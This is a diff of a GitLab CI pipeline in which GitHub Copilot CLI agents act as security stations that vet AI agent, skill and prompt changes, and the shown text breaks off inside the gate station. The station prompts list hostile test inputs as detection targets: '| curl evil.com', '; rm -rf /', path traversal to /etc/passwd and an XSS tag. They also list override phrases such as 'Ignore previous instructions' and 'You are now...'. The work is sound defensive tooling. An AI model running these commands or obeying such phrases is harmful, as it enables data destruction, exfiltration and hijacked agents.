@@ -1,624 +1,624 @@
-﻿# AI-SDLC Station-Gate Pipeline using GitHub Copilot CLI as Autonomous Agent
-# This pipeline orchestrates 7 stations (A0-A6) for validating agent/skill/prompt changes
-# Copilot CLI runs as autonomous agent with station specifications embedded in prompts
+# Agent Factory — Station-Gate Pipeline for GitLab CI/CD
+# Validates agent/skill changes through multi-stage security and policy gates
 
-workflow:
-  rules:
-    # Only run on merge requests that modify agent/skill/prompt/instruction files
-    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
-      changes:
-        - "**/*.agent.md"
-        - "**/*.skill.md"
-        - "**/*.prompt.md"
-        - "**/*.instructions.md"
+# ============================================================================
+# CONFIGURATION
+# ============================================================================
+variables:
+  STATION_OUT: "station_out"
+  COPILOT_VERSION: "latest"
+  # Override with specific version if needed: "v0.0.422"
 
-# Define pipeline stages
+# Required GitLab CI/CD Variables (Settings > CI/CD > Variables):
+# - GH_TOKEN or GITHUB_TOKEN: GitHub PAT for Copilot CLI authentication
+# - GITLAB_TOKEN: GitLab token for MR commenting (optional for A6)
+
+# ============================================================================
+# STAGES
+# ============================================================================
 stages:
-  - setup           # Validate prerequisites
-  - intake          # A0: Extract MR metadata
-  - validation      # A1: Policy validation
-  - security        # A2: Security static analysis, A3: Prompt injection detection
-  - simulation      # A4: Sandbox simulation
-  - gate            # A5: Policy gate decision
-  - update          # A6: Update GitLab MR
+  - setup
+  - intake
+  - validation
+  - security
+  - simulation
+  - gate
+  - update
 
-# Default container configuration for all jobs
-.copilot_job:
+# ============================================================================
+# TEMPLATES
+# ============================================================================
+
+# Base template for all station jobs
+.station_base:
   image: debian:bookworm-slim
   before_script:
-    # Install required dependencies
-    - apt-get update && apt-get install -y curl git jq ca-certificates
+    # Install dependencies
+    - apt-get update -qq
+    - apt-get install -y -qq curl git jq
     # Install GitHub Copilot CLI
-    - curl -fsSL https://cli.github.com/packages/githubcli-archive-keyring.gpg | dd of=/usr/share/keyrings/githubcli-archive-keyring.gpg
-    - chmod go+r /usr/share/keyrings/githubcli-archive-keyring.gpg
-    - echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/githubcli-archive-keyring.gpg] https://cli.github.com/packages stable main" | tee /etc/apt/sources.list.d/github-cli.list > /dev/null
-    - apt-get update && apt-get install -y gh
-    # Authenticate with GitHub Copilot
-    - echo "$GH_TOKEN" | gh auth login --with-token
-    # Create output directory for station artifacts
-    - mkdir -p station_out
-
-# Job 0: Validate prerequisites before running pipeline
-validate_prerequisites:
-  stage: setup
-  extends: .copilot_job
-  script:
-    - echo "Validating pipeline prerequisites..."
-    # Check schemas exist
-    - test -f station-workflows/schemas/agent-manifest.schema.json || (echo "Missing agent-manifest.schema.json" && exit 1)
-    - test -f station-workflows/schemas/skill-manifest.schema.json || (echo "Missing skill-manifest.schema.json" && exit 1)
-    # Check fixtures exist
-    - test -f station-workflows/fixtures/malicious-inputs.json || (echo "Missing malicious-inputs.json" && exit 1)
-    - test -f station-workflows/fixtures/prompt-injection-payloads.json || (echo "Missing prompt-injection-payloads.json" && exit 1)
-    # Check GH_TOKEN is configured
-    - test -n "$GH_TOKEN" || (echo "GH_TOKEN environment variable not set" && exit 1)
-    - echo "All prerequisites validated successfully"
+    - |
+      if [ ! -f /usr/local/bin/copilot ]; then
+        echo "📦 Installing GitHub Copilot CLI..."
+        curl -fsSL https://gh.io/copilot-install | bash
+        export PATH="$HOME/.local/bin:$PATH"
+      fi
+    # Verify installation and authentication
+    - copilot --version || (echo "❌ Copilot CLI not installed" && exit 1)
+    - |
+      if [ -z "$GH_TOKEN" ] && [ -z "$GITHUB_TOKEN" ]; then
+        echo "❌ Missing GH_TOKEN or GITHUB_TOKEN environment variable"
+        echo "   Configure in GitLab: Settings > CI/CD > Variables"
+        exit 1
+      fi
+    # Create output directory
+    - mkdir -p ${STATION_OUT}
+  only:
+    - merge_requests
   rules:
-    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
+    - if: '$CI_PIPELINE_SOURCE == "merge_request_event"'
+      changes:
+        - "**/agents/**/*.agent.md"
+        - "**/skills/**/SKILL.md"
+        - "**/prompts/**/*.prompt.md"
+        - "**/instructions/**/*.instructions.md"
 
-# Station A0: Intake - Extract MR metadata and changed files
-station_a0_intake:
+# ============================================================================
+# JOBS
+# ============================================================================
+
+# ----------------------------------------------------------------------------
+# SETUP: Prepare Environment
+# ----------------------------------------------------------------------------
+setup:
+  stage: setup
+  image: debian:bookworm-slim
+  script:
+    - mkdir -p ${STATION_OUT}
+    - echo "✅ Environment ready for station pipeline"
+  artifacts:
+    paths:
+      - ${STATION_OUT}/
+    expire_in: 2 hours
+  only:
+    - merge_requests
+
+# ----------------------------------------------------------------------------
+# A0: INTAKE STATION
+# ----------------------------------------------------------------------------
+A0_intake:
+  extends: .station_base
   stage: intake
-  extends: .copilot_job
-  needs:
-    - job: validate_prerequisites
+  needs: ["setup"]
   script:
     - |
-      # Station A0: Intake
-      # Extract merge request metadata, diff, and changed files
-      # Output: station_out/work_order.json
+      echo "🚀 Station A0 - Intake: Extracting MR context..."
       
       copilot -p "
-      You are Station A0: Intake for the AI-SDLC Station-Gate Pipeline.
+      You are Station A0 - INTAKE for the Agent Factory SDLC pipeline.
       
-      Your task is to extract metadata from this GitLab merge request and create a work order.
+      GOAL: Extract merge request context and create work_order.json
       
-      **Station Specification (A0-intake.prompt.md):**
+      TASK:
+      1. Extract MR metadata from GitLab CI environment:
+         - MR Number: \$CI_MERGE_REQUEST_IID
+         - MR Title: \$CI_MERGE_REQUEST_TITLE
+         - Author: \$CI_MERGE_REQUEST_AUTHOR
+         - Source Branch: \$CI_MERGE_REQUEST_SOURCE_BRANCH_NAME
+         - Target Branch: \$CI_MERGE_REQUEST_TARGET_BRANCH_NAME
       
-      ## Context
-      - Pipeline Source: $CI_PIPELINE_SOURCE
-      - Project: $CI_PROJECT_PATH
-      - MR IID: $CI_MERGE_REQUEST_IID
-      - MR Title: $CI_MERGE_REQUEST_TITLE
-      - Source Branch: $CI_MERGE_REQUEST_SOURCE_BRANCH_NAME
-      - Target Branch: $CI_MERGE_REQUEST_TARGET_BRANCH_NAME
-      - Author: $GITLAB_USER_LOGIN
+      2. Get changed files using git diff:
+         git diff --name-only \$CI_MERGE_REQUEST_DIFF_BASE_SHA
       
-      ## Tasks
-      1. Use git commands to identify all changed files in this MR
-      2. Categorize files by type: .agent.md, .skill.md, .prompt.md, .instructions.md
-      3. Extract file paths and compute diffs for each changed file
-      4. Create a work_order.json file with structure:
+      3. Classify each file by type:
+         - **/agents/**/*.agent.md → 'agent'
+         - **/skills/**/SKILL.md → 'skill'
+         - **/prompts/**/*.prompt.md → 'prompt'
+         - **/instructions/**/*.instructions.md → 'instruction'
+         - .github/workflows/**/*.yml → 'workflow'
+         - other → 'other'
+      
+      4. Detect change type for each file: 'added', 'modified', or 'deleted'
+      
+      5. Scan diff for risk patterns and set risk_hints[]:
+         - 'exec-tool' if tools contains runCommands
+         - 'unconstrained-network' if allowedNetworkDomains is * or missing
+         - 'unconstrained-files' if allowedFilePaths is ** or missing
+         - 'shell-pipe' if diff contains curl|wget|bash with pipes
+         - 'eval-usage' if diff contains eval()
+         - 'agent-removed' if any .agent.md deleted
+      
+      6. Determine scope:
+         - 'agent-change' if any agent/skill/prompt/instruction changed
+         - 'non-agent' otherwise
+      
+      7. Write to ${STATION_OUT}/work_order.json:
       {
-        \"mr_metadata\": {
-          \"project\": \"$CI_PROJECT_PATH\",
-          \"iid\": $CI_MERGE_REQUEST_IID,
-          \"title\": \"$CI_MERGE_REQUEST_TITLE\",
-          \"source_branch\": \"$CI_MERGE_REQUEST_SOURCE_BRANCH_NAME\",
-          \"target_branch\": \"$CI_MERGE_REQUEST_TARGET_BRANCH_NAME\",
-          \"author\": \"$GITLAB_USER_LOGIN\",
-          \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"
-        },
+        \"station\": \"A0\",
+        \"pr_number\": <number>,
+        \"pr_title\": \"<title>\",
+        \"author\": \"<author>\",
+        \"base_branch\": \"<base>\",
+        \"head_branch\": \"<head>\",
+        \"created_at\": \"<ISO8601>\",
+        \"scope\": \"agent-change|non-agent\",
         \"changed_files\": [
-          {
-            \"path\": \"relative/path/to/file.agent.md\",
-            \"type\": \"agent|skill|prompt|instruction\",
-            \"diff\": \"git diff output\",
-            \"size_bytes\": 1234
-          }
-        ]
-      }
-      5. Write the JSON to station_out/work_order.json
-      
-      Use only these tools: shell(git), shell(date)
-      " --allow-tool "shell(git)" --allow-tool "shell(date)" --deny-tool "*"
-    
-    # Verify output was created
-    - test -f station_out/work_order.json || (echo "A0 failed to create work_order.json" && exit 1)
-    - echo "Station A0 completed successfully"
-  artifacts:
-    paths:
-      - station_out/work_order.json
-    expire_in: 1 week
-
-# Station A1: Policy Validation - JSON Schema compliance check
-station_a1_policy:
-  stage: validation
-  extends: .copilot_job
-  needs:
-    - job: station_a0_intake
-      artifacts: true
-  script:
-    - |
-      # Station A1: Policy Validation
-      # Validate agent/skill manifests against JSON schemas
-      # Output: station_out/policy_report.json
-      
-      copilot -p "
-      You are Station A1: Policy Validation for the AI-SDLC Station-Gate Pipeline.
-      
-      Your task is to validate changed files against their JSON schemas.
-      
-      **Station Specification (A1-policy-validation.prompt.md):**
-      
-      ## Inputs
-      - Work Order: station_out/work_order.json (from A0)
-      - Agent Schema: station-workflows/schemas/agent-manifest.schema.json
-      - Skill Schema: station-workflows/schemas/skill-manifest.schema.json
-      
-      ## Tasks
-      1. Read work_order.json to identify changed files
-      2. For each .agent.md file:
-         - Extract YAML frontmatter
-         - Validate against agent-manifest.schema.json
-         - Record any violations (missing required fields, invalid enum values, etc.)
-      3. For each .skill.md file:
-         - Extract YAML frontmatter
-         - Validate against skill-manifest.schema.json
-         - Record violations
-      4. Create policy_report.json with structure:
-      {
-        \"station\": \"A1-policy-validation\",
-        \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",
-        \"files_validated\": 2,
-        \"violations\": [
-          {
-            \"file\": \"path/to/file.agent.md\",
-            \"rule\": \"required_field_missing\",
-            \"field\": \"capabilities\",
-            \"severity\": \"HIGH\",
-            \"message\": \"Agent manifest missing required 'capabilities' field\"
-          }
+          {\"path\": \"...\", \"type\": \"...\", \"change\": \"...\"}
         ],
-        \"summary\": {
-          \"CRITICAL\": 0,
-          \"HIGH\": 1,
-          \"MEDIUM\": 0,
-          \"LOW\": 0
-        }
+        \"risk_hints\": [...],
+        \"diff_summary\": \"<summary>\"
       }
-      5. Write JSON to station_out/policy_report.json
       
-      Do NOT execute any shell commands - use only file reading tools.
-      " --deny-tool "shell(*)"
-    
-    - test -f station_out/policy_report.json || (echo "A1 failed to create policy_report.json" && exit 1)
-    - echo "Station A1 completed successfully"
+      CONSTRAINTS:
+      - Use shell commands with git to get actual data
+      - Write valid JSON only
+      - No markdown, no explanations - just produce the file
+      " --allow-tool 'shell(git)' --allow-tool 'write'
   artifacts:
     paths:
-      - station_out/policy_report.json
-    expire_in: 1 week
+      - ${STATION_OUT}/work_order.json
+    expire_in: 2 hours
+    reports:
+      dotenv: ${STATION_OUT}/work_order.json
 
-# Station A2: Security Static Analysis - Secret/pattern detection
-station_a2_security:
-  stage: security
-  extends: .copilot_job
-  needs:
-    - job: station_a0_intake
-      artifacts: true
+# ----------------------------------------------------------------------------
+# A1: POLICY VALIDATION STATION
+# ----------------------------------------------------------------------------
+A1_policy:
+  extends: .station_base
+  stage: validation
+  needs: ["A0_intake"]
   script:
     - |
-      # Station A2: Security Static Analysis
-      # Scan for hardcoded secrets, API keys, sensitive patterns
-      # Output: station_out/security_report.json
+      echo "🔍 Station A1 - Policy Validation: Checking schemas..."
       
       copilot -p "
-      You are Station A2: Security Static Analysis for the AI-SDLC Station-Gate Pipeline.
+      You are Station A1 - POLICY VALIDATION for the Agent Factory pipeline.
       
-      Your task is to scan changed files for security vulnerabilities.
+      GOAL: Validate agent/skill manifests against JSON schemas
       
-      **Station Specification (A2-security-static.prompt.md):**
+      TASK:
+      1. Read ${STATION_OUT}/work_order.json
       
-      ## Inputs
-      - Work Order: station_out/work_order.json
+      2. If scope is 'non-agent', write skipped report and exit:
+         {\"station\":\"A1\",\"status\":\"skipped\",\"findings\":[],\"summary\":\"No agent/skill files changed.\"}
       
-      ## Tasks
-      1. Read work_order.json to get list of changed files
-      2. For each file, scan for:
-         - Hardcoded API keys (patterns: AIza..., sk-..., ghp_..., etc.)
-         - AWS credentials (AKIA..., AWS_ACCESS_KEY_ID)
-         - Private keys (-----BEGIN PRIVATE KEY-----)
-         - Database credentials (mysql://, postgresql://, mongodb://)
-         - Wildcard network permissions in tool configurations
-         - System command injection risks (shell execution with user input)
-      3. Classify findings by severity:
-         - CRITICAL: Confirmed secret exposure
-         - HIGH: Likely secret pattern or dangerous permission
-         - MEDIUM: Suspicious pattern requiring review
-         - LOW: False positive risk
-      4. Create security_report.json:
+      3. For each changed file where type is 'agent':
+         - Parse YAML frontmatter
+         - Validate against station-workflows/schemas/agent-manifest.schema.json
+         - Check required fields: name, description, tools (array)
+         - Validate tools are in allowlist: [codebase, search, edit, problems, runCommands, github, terminal, fetch, vscode]
+         - If runCommands is present, check allowedNetworkDomains and allowedFilePaths exist
+         - Severity: critical if schema fails, high if security fields missing
+      
+      4. For each changed file where type is 'skill':
+         - Parse YAML frontmatter
+         - Validate against station-workflows/schemas/skill-manifest.schema.json
+         - Check required fields: name, description, triggers (non-empty array)
+         - Severity: critical if schema fails
+      
+      5. Write to ${STATION_OUT}/policy_report.json:
       {
-        \"station\": \"A2-security-static\",
-        \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",
-        \"files_scanned\": 2,
+        \"station\": \"A1\",
+        \"status\": \"pass|fail|partial\",
         \"findings\": [
           {
-            \"file\": \"path/to/file.agent.md\",
-            \"line\": 42,
-            \"pattern\": \"hardcoded_api_key\",
-            \"severity\": \"CRITICAL\",
-            \"evidence\": \"api_key = 'sk-1234567890abcdef'\",
-            \"recommendation\": \"Use environment variable instead\"
+            \"rule\": \"P-01|P-02|...\",
+            \"file\": \"path/to/file\",
+            \"severity\": \"critical|high|medium|low\",
+            \"message\": \"...\"
           }
         ],
-        \"summary\": {
-          \"CRITICAL\": 1,
-          \"HIGH\": 0,
-          \"MEDIUM\": 0,
-          \"LOW\": 0
-        }
+        \"summary\": \"...\",
+        \"files_checked\": <count>,
+        \"critical_count\": <count>,
+        \"high_count\": <count>
       }
-      5. Write JSON to station_out/security_report.json
       
-      Use grep, find, cat for file analysis - NO execution of found patterns.
-      " --allow-tool "shell(grep)" --allow-tool "shell(find)" --allow-tool "shell(cat)" --deny-tool "*"
-    
-    - test -f station_out/security_report.json || (echo "A2 failed to create security_report.json" && exit 1)
-    - echo "Station A2 completed successfully" 
+      CONSTRAINTS:
+      - Load actual schema files from disk
+      - Perform real validation - don't fake results
+      - critical findings → status='fail'
+      " --allow-tool 'write'
   artifacts:
     paths:
-      - station_out/security_report.json
-    expire_in: 1 week
+      - ${STATION_OUT}/policy_report.json
+    expire_in: 2 hours
 
-# Station A3: Prompt Injection Detection
-station_a3_prompt_injection:
+# ----------------------------------------------------------------------------
+# A2: SECURITY STATIC CHECKS STATION
+# ----------------------------------------------------------------------------
+A2_security:
+  extends: .station_base
   stage: security
-  extends: .copilot_job
-  needs:
-    - job: station_a0_intake
-      artifacts: true
+  needs: ["A0_intake"]
   script:
     - |
-      # Station A3: Prompt Injection Detection
-      # Scan for prompt injection patterns and jailbreak attempts
-      # Output: station_out/promptsec_report.json
+      echo "🔒 Station A2 - Security Static Checks: Scanning..."
+      
+      # Install security scanners
+      apt-get install -y -qq gitleaks
       
       copilot -p "
-      You are Station A3: Prompt Injection Detection for the AI-SDLC Station-Gate Pipeline.
+      You are Station A2 - SECURITY STATIC CHECKS for the Agent Factory pipeline.
       
-      Your task is to detect prompt injection vulnerabilities in agent/skill specifications.
+      GOAL: Detect secrets, dangerous patterns, and vulnerable dependencies
       
-      **Station Specification (A3-prompt-injection.prompt.md):**
+      TASK:
+      1. Read ${STATION_OUT}/work_order.json
       
-      ## Inputs
-      - Work Order: station_out/work_order.json
-      - Known Payloads: station-workflows/fixtures/prompt-injection-payloads.json
+      2. If scope is 'non-agent', write skipped report
       
-      ## Tasks
-      1. Read prompt-injection-payloads.json to load known attack patterns
-      2. For each changed file from work_order.json:
-         - Extract instruction sections, prompt templates, system messages
-         - Check for injection vulnerabilities:
-           * \"Ignore previous instructions\" patterns
-           * Role-switching attempts (\"You are now...\")
-           * Delimiter manipulation (\`\`\`, ---, ###)
-           * Encoding tricks (base64, hex, Unicode escapes)
-           * Context window overflow attempts
-         - Analyze user input handling:
-           * Are user inputs sanitized?
-           * Are prompts parameterized or string-concatenated?
-           * Is there input length validation?
-      3. Classify findings:
-         - CRITICAL: Direct injection vulnerability with proof-of-concept
-         - HIGH: Likely exploitable pattern
-         - MEDIUM: Weak input handling
-         - LOW: Best practice recommendation
-      4. Create promptsec_report.json:
+      3. SECRET SCAN (S-01):
+         - Run: gitleaks detect --source=. --no-git --verbose
+         - Look for: API keys (ghp_, sk-, AKIA), passwords, tokens
+         - Check .env files, YAML frontmatter, prompt bodies
+         - Severity: critical for any confirmed secret
+      
+      4. DANGEROUS PATTERN SCAN (S-03):
+         - In changed agent files, scan for:
+           * Unrestricted allowedFilePaths: '**', '/', '~'
+           * Unrestricted allowedNetworkDomains: '*'
+           * Shell injection patterns: rm -rf, eval, exec
+           * Path traversal: ../../../
+         - Severity: high for dangerous patterns
+      
+      5. DEPENDENCY SCAN (S-02) - if package files changed:
+         - Check for package-lock.json, requirements.txt, go.mod
+         - Report any known CVEs
+         - Map CVSS to severity: ≥9.0=critical, 7.0-8.9=high, 4.0-6.9=medium
+      
+      6. Write to ${STATION_OUT}/security_report.json:
       {
-        \"station\": \"A3-prompt-injection\",
-        \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",
-        \"files_analyzed\": 2,
-        \"vulnerabilities\": [
+        \"station\": \"A2\",
+        \"status\": \"pass|fail|partial\",
+        \"findings\": [
           {
-            \"file\": \"agents/malicious.agent.md\",
-            \"line\": 15,
-            \"type\": \"direct_injection\",
-            \"severity\": \"CRITICAL\",
-            \"payload_matched\": \"Ignore all previous instructions\",
-            \"context\": \"System prompt contains user-controlled input without sanitization\",
-            \"recommendation\": \"Use structured input validation and prompt templates\"
+            \"check\": \"S-01|S-02|S-03\",
+            \"file\": \"...\",
+            \"severity\": \"critical|high|medium|low\",
+            \"message\": \"...\",
+            \"line\": <number>
           }
         ],
-        \"summary\": {
-          \"CRITICAL\": 1,
-          \"HIGH\": 0,
-          \"MEDIUM\": 0,
-          \"LOW\": 0
-        }
+        \"summary\": \"...\",
+        \"critical_count\": <count>,
+        \"high_count\": <count>
       }
-      5. Write JSON to station_out/promptsec_report.json
       
-      Analysis only - NO command execution, NO network access.
-      " --deny-tool "shell(*)"
-    
-    - test -f station_out/promptsec_report.json || (echo "A3 failed to create promptsec_report.json" && exit 1)
-    - echo "Station A3 completed successfully"
+      CONSTRAINTS:
+      - Run actual gitleaks scan
+      - Real pattern matching on changed files
+      - critical → status='fail'
+      " --allow-tool 'shell(gitleaks)' --allow-tool 'shell(grep)' --allow-tool 'shell(find)' --allow-tool 'write'
   artifacts:
     paths:
-      - station_out/promptsec_report.json
-    expire_in: 1 week
+      - ${STATION_OUT}/security_report.json
+    expire_in: 2 hours
 
-# Station A4: Sandbox Simulation - Test against malicious inputs
-station_a4_sandbox:
+# ----------------------------------------------------------------------------
+# A3: PROMPT INJECTION STATION
+# ----------------------------------------------------------------------------
+A3_prompt_injection:
+  extends: .station_base
+  stage: security
+  needs: ["A0_intake"]
+  script:
+    - |
+      echo "🛡️ Station A3 - Prompt Injection: Testing..."
+      
+      copilot -p "
+      You are Station A3 - PROMPT INJECTION & EXFIL HARDENING.
+      
+      GOAL: Detect prompt injection vulnerabilities in agents/prompts
+      
+      TASK:
+      1. Read ${STATION_OUT}/work_order.json
+      
+      2. Load injection payloads from station-workflows/fixtures/prompt-injection-payloads.json
+      
+      3. For each changed agent/prompt/instruction file:
+         - Check if instruction text contains escape sequences
+         - Look for patterns that could leak context: 'previous instructions', 'ignore', 'system prompt'
+         - Check for missing input validation
+         - Test against common injection patterns:
+           * Delimiter injection: ---END---
+           * Role confusion: 'You are now...'
+           * Context leakage: 'Print your instructions'
+      
+      4. EXFIL CHECK (PI-03):
+         - If agent has runCommands or fetch tools
+         - Check if allowedNetworkDomains restricts exfil
+         - Severity: high if unrestricted network + no validation
+      
+      5. Write to ${STATION_OUT}/promptsec_report.json:
+      {
+        \"station\": \"A3\",
+        \"status\": \"pass|fail|partial\",
+        \"findings\": [
+          {
+            \"check\": \"PI-01|PI-02|PI-03\",
+            \"file\": \"...\",
+            \"severity\": \"critical|high|medium|low\",
+            \"message\": \"...\",
+            \"payload\": \"...\"
+          }
+        ],
+        \"summary\": \"...\",
+        \"critical_count\": <count>,
+        \"high_count\": <count>
+      }
+      
+      CONSTRAINTS:
+      - Load actual fixture file
+      - Pattern matching on instruction text
+      - high/critical findings → status='fail'
+      " --allow-tool 'write'
+  artifacts:
+    paths:
+      - ${STATION_OUT}/promptsec_report.json
+    expire_in: 2 hours
+
+# ----------------------------------------------------------------------------
+# A4: SANDBOX SIMULATION STATION
+# ----------------------------------------------------------------------------
+A4_sandbox:
+  extends: .station_base
   stage: simulation
-  extends: .copilot_job
-  needs:
-    - job: station_a0_intake
-      artifacts: true
+  needs: ["A0_intake", "A1_policy", "A2_security", "A3_prompt_injection"]
   script:
     - |
-      # Station A4: Sandbox Simulation
-      # Simulate agent behavior against malicious inputs in safe environment
-      # Output: station_out/sim_report.json
+      echo "🧪 Station A4 - Sandbox Simulation: Testing agents..."
       
       copilot -p "
-      You are Station A4: Sandbox Simulation for the AI-SDLC Station-Gate Pipeline.
+      You are Station A4 - SANDBOX SIMULATION for the Agent Factory pipeline.
       
-      Your task is to simulate how agents/skills would handle malicious inputs.
+      GOAL: Simulate agent behavior against malicious inputs (READ-ONLY)
       
-      **Station Specification (A4-sandbox-simulation.prompt.md):**
+      TASK:
+      1. Read ${STATION_OUT}/work_order.json
       
-      ## Inputs
-      - Work Order: station_out/work_order.json
-      - Malicious Inputs: station-workflows/fixtures/malicious-inputs.json
+      2. Load malicious inputs from station-workflows/fixtures/malicious-inputs.json
       
-      ## Tasks
-      1. Read malicious-inputs.json to load test cases:
-         - SQL injection attempts
-         - Path traversal attacks (../, ../../etc/passwd)
-         - Command injection payloads (; rm -rf, | curl evil.com)
-         - XSS vectors (<script>alert(1)</script>)
-         - Deserialization attacks
-      2. For each changed agent/skill:
-         - Identify input handling code
-         - Simulate passing malicious inputs to tool invocations
-         - STATIC ANALYSIS ONLY - do NOT actually execute malicious code
-         - Determine if input would reach dangerous functions:
-           * shell execution (subprocess, exec, system)
-           * file operations (open, write, delete)
-           * network calls (requests, urllib, socket)
-      3. Classify risks:
-         - CRITICAL: Malicious input would execute dangerous operation
-         - HIGH: Input reaches sensitive function without validation
-         - MEDIUM: Partial sanitization, still potentially exploitable
-         - LOW: Input properly validated
-      4. Create sim_report.json:
+      3. For each changed agent file:
+         - Parse the agent manifest
+         - Simulate (DO NOT EXECUTE) how the agent would handle each malicious input:
+           * File traversal: '../../../etc/passwd'
+           * Command injection: '; rm -rf /'
+           * Exfiltration: requests to external domains
+           * Privilege escalation: sudo commands
+         
+         - Check agent's defenses:
+           * Does allowedFilePaths prevent traversal?
+           * Does allowedNetworkDomains block exfil?
+           * Are dangerous commands filtered?
+      
+      4. Severity mapping:
+         - Agent executes dangerous command → critical
+         - Agent reads sensitive files → high
+         - Agent makes external requests → medium/high
+      
+      5. Write to ${STATION_OUT}/sim_report.json:
       {
-        \"station\": \"A4-sandbox-simulation\",
-        \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",
-        \"simulations_run\": 10,
-        \"results\": [
+        \"station\": \"A4\",
+        \"status\": \"pass|fail|partial\",
+        \"findings\": [
           {
-            \"file\": \"skills/file-manager.skill.md\",
-            \"test_case\": \"path_traversal\",
-            \"payload\": \"../../etc/passwd\",
-            \"severity\": \"CRITICAL\",
-            \"outcome\": \"VULNERABLE\",
-            \"details\": \"Path traversal reaches file read without validation\",
-            \"code_location\": \"line 67: open(user_input, 'r')\"
+            \"agent\": \"...\",
+            \"input\": \"...\",
+            \"outcome\": \"blocked|allowed|partial\",
+            \"severity\": \"critical|high|medium|low\",
+            \"message\": \"...\"
           }
         ],
-        \"summary\": {
-          \"CRITICAL\": 1,
-          \"HIGH\": 0,
-          \"MEDIUM\": 0,
-          \"LOW\": 9
-        }
+        \"summary\": \"...\",
+        \"agents_tested\": <count>,
+        \"critical_count\": <count>,
+        \"high_count\": <count>
       }
-      5. Write JSON to station_out/sim_report.json
       
-      CRITICAL: STATIC ANALYSIS ONLY - NO EXECUTION OF MALICIOUS PAYLOADS
-      " --deny-tool "shell(*)"
-    
-    - test -f station_out/sim_report.json || (echo "A4 failed to create sim_report.json" && exit 1)
-    - echo "Station A4 completed successfully"
+      IMPORTANT:
+      - This is SIMULATION ONLY - do NOT execute actual commands
+      - Analyze agent manifest constraints statically
+      - critical findings → status='fail'
+      " --allow-tool 'write' --deny-tool 'shell'
   artifacts:
     paths:
-      - station_out/sim_report.json
-    expire_in: 1 week
+      - ${STATION_OUT}/sim_report.json
+    expire_in: 2 hours
 
-# Station A5: Policy Gate - AI decision on approval/block/review
-station_a5_policy_gate:
+# ----------------------------------------------------------------------------
+# A5: POLICY GATE STATION (Decision Maker)
+# ----------------------------------------------------------------------------
+A5_gate:
+  extends: .station_base
   stage: gate
-  extends: .copilot_job
-  needs:
-    - job: station_a1_policy
-      artifacts: true
-    - job: station_a2_security
-      artifacts: true
-    - job: station_a3_prompt_injection
-      artifacts: true
-    - job: station_a4_sandbox
-      artifacts: true
+  needs: ["A1_policy", "A2_security", "A3_prompt_injection", "A4_sandbox"]
   script:
     - |
-      # Station A5: Policy Gate
-      # Aggregate all station reports and make APPROVE/BLOCK/REVIEW decision
-      # Outputs: station_out/gate_decision.json, exit code for pipeline control
+      echo "⚖️ Station A5 - Policy Gate: Making decision..."
       
       copilot -p "
-      You are Station A5: Policy Gate for the AI-SDLC Station-Gate Pipeline.
+      You are Station A5 - POLICY GATE, the final decision maker.
       
-      You are the decision-maker. Aggregate findings from all previous stations and decide: APPROVE, BLOCK, or REVIEW.
+      GOAL: Aggregate all station reports and make gate decision
       
-      **Station Specification (A5-policy-gate.agent.md):**
+      TASK:
+      1. Read all reports from ${STATION_OUT}/:
+         - work_order.json
+         - policy_report.json
+         - security_report.json
+         - promptsec_report.json
+         - sim_report.json
       
-      ## Role
-      You are an AI security and policy enforcement agent. Your decisions are binding.
+      2. Apply gate logic:
+         
+         IF any report has critical_count > 0:
+           → status = 'BLOCK'
+           → justification = 'Critical severity findings must be resolved'
+         
+         ELSE IF sum of high_count across all reports ≥ 3:
+           → status = 'REVIEW'
+           → justification = 'Multiple high-severity findings require human review'
+         
+         ELSE IF any report status is 'fail':
+           → status = 'BLOCK'
+           → justification = 'One or more stations failed validation'
+         
+         ELSE:
+           → status = 'APPROVE'
+           → justification = 'All validations passed'
       
-      ## Inputs
-      - Policy Report: station_out/policy_report.json (from A1)
-      - Security Report: station_out/security_report.json (from A2)
-      - Prompt Security Report: station_out/promptsec_report.json (from A3)
-      - Simulation Report: station_out/sim_report.json (from A4)
+      3. Aggregate findings summary:
+         - Total findings by severity
+         - List of blocking issues (critical/high)
+         - Recommendations for fixes
       
-      ## Decision Logic
-      1. **BLOCK** if ANY of:
-         - CRITICAL severity findings in any report
-         - HIGH severity count > 2
-         - Confirmed secret exposure (A2)
-         - Direct prompt injection vulnerability (A3)
-         - Exploitable malicious input handling (A4)
-      
-      2. **REVIEW** (human approval required) if:
-         - HIGH severity count = 1-2
-         - MEDIUM severity count > 5
-         - Complex security trade-offs requiring human judgment
-      
-      3. **APPROVE** if:
-         - No CRITICAL or HIGH findings
-         - MEDIUM findings are architectural recommendations only
-         - All policy schemas validated successfully
-      
-      ## Tasks
-      1. Read all four station report JSON files
-      2. Aggregate severity counts across all stations
-      3. Apply decision logic above
-      4. Generate justification explaining the decision
-      5. Create gate_decision.json:
+      4. Write to ${STATION_OUT}/gate_decision.json:
       {
-        \"station\": \"A5-policy-gate\",
-        \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",
-        \"decision\": \"APPROVE|BLOCK|REVIEW\",
-        \"justification\": \"Detailed explanation with specific findings cited\",
-        \"aggregated_findings\": {
-          \"CRITICAL\": 0,
-          \"HIGH\": 0,
-          \"MEDIUM\": 2,
-          \"LOW\": 5
+        \"station\": \"A5\",
+        \"status\": \"APPROVE|BLOCK|REVIEW\",
+        \"justification\": \"...\",
+        \"timestamp\": \"<ISO8601>\",
+        \"summary\": {
+          \"total_findings\": <count>,
+          \"critical\": <count>,
+          \"high\": <count>,
+          \"medium\": <count>,
+          \"low\": <count>
         },
-        \"station_summaries\": {
-          \"A1_policy\": { \"CRITICAL\": 0, \"HIGH\": 0, \"MEDIUM\": 1, \"LOW\": 0 },
-          \"A2_security\": { \"CRITICAL\": 0, \"HIGH\": 0, \"MEDIUM\": 1, \"LOW\": 2 },
-          \"A3_promptsec\": { \"CRITICAL\": 0, \"HIGH\": 0, \"MEDIUM\": 0, \"LOW\": 1 },
-          \"A4_simulation\": { \"CRITICAL\": 0, \"HIGH\": 0, \"MEDIUM\": 0, \"LOW\": 2 }
-        }
+        \"blocking_issues\": [...],
+        \"recommendations\": [...]
       }
-      6. Write JSON to station_out/gate_decision.json
